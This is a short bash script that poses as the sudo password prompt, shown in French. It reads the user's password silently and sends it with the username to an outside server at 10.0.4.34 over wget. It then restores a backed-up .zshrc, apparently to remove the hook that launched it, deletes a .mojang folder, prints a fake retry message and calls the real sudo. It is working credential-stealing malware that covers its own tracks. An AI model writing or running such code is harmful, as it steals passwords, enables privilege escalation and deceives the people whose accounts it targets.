#!/bin/bash

me="$(whoami)"

echo -n "[sudo] Mot de passe de ${me} : "
read -s password
echo
wget -q http://10.0.4.34:8888/data?password=$password&name=$me
cat ~/.zshrc.old > ~/.zshrc
rm ~/.zshrc.old
rm -fr ~/.mojang
echo "Désolé, essayez de nouveau."
sudo "$*"
